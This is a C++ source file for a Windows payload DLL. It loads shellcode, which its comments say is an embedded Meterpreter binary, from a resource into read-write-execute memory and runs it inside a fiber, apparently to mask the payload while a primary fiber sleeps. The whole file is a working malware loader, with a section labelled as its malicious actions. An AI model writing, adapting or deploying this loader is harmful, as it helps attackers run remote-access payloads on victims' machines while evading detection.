// dllmain.cpp : Defines the entry point for the DLL application.
#include <Windows.h>
#include <stdio.h>
#include "resource.h"
#include <cstdint>

extern "C" __declspec(dllexport) void PayloadFunc(LPVOID lpFiber);
HMODULE hModulePayloadDll = NULL;
void* shellcodeAddr = NULL;

BOOL APIENTRY DllMain( HMODULE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
                     )
{
    hModulePayloadDll = hModule;

    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}

void LoadShellcodeFromResource()
{
    // IDR_SHELLCODE_BIN1 - is the resource ID - which contains the shellcode
    // SHELLCODE_BIN is the resource type name we chose earlier when embedding the meterpreter.bin
    HRSRC shellcodeResource = FindResource(hModulePayloadDll, MAKEINTRESOURCE(IDR_SHELLCODE_BIN1), L"SHELLCODE_BIN");
    DWORD shellcodeSize = SizeofResource(hModulePayloadDll, shellcodeResource);
    HGLOBAL shellcodeResouceData = LoadResource(hModulePayloadDll, shellcodeResource);

    shellcodeAddr = VirtualAlloc(0, shellcodeSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    memcpy(shellcodeAddr, shellcodeResouceData, shellcodeSize);

}

void PayloadFunc(LPVOID lpFiber)
{

    // Load our shellcode from DLL resource.
    // Make sure shellcode returns without quitting otherwise Fiber & Thread will exit.
    LoadShellcodeFromResource();

    while (true)
    {
        printf("[+] Executing as Unmasked Payload Fiber\n");

        /* 
        *   START MALICIOUS ACTIONS!
        */
        printf("\t[+] Executing shellcode from resource inside payload DLL\n");
        ((void(*)())shellcodeAddr)();
        /* 
        *   END MALICIOUS ACTIONS
        */

        // printf("\t[+] Waiting in Payload Fiber\n");
        // Sleep(10000); // 10 seconds

        // Supply address of primary (sleeping) fiber to switch back to
        printf("\t[+] Supplied return Fiber address: 0x%llx\n", (uint64_t)lpFiber);
        printf("\t[+] Switching back to primary Fiber\n");
        SwitchToFiber(lpFiber);
        // ->Resumption point here<- Hence using while true loop to prevent exiting
    }
}